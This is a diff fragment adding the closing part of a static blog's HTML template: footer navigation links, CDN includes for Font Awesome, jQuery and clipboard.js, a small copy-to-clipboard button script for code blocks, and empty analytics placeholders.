+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
